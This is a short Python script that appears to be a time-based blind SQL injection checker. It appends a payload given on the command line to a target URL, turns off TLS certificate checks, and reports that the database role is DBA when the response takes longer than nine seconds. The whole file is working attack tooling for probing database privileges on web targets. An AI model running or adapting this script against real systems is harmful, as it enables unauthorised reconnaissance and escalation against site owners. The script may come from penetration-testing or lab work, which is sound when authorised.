import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def blind1():
    if len(sys.argv) != 3:
        print("Usage: python3 test.py <target> <payload>")
        sys.exit(1)

    url = sys.argv[1]
    payload = sys.argv[2]

    response = requests.get(url + payload, verify=False)

    print("Response Time:", response.elapsed.total_seconds(), "seconds")
    
    if response.elapsed.total_seconds() > 9:
        print ("ROLE is DBA")
    else:
        print ("ROLE is not DBA")
blind1()
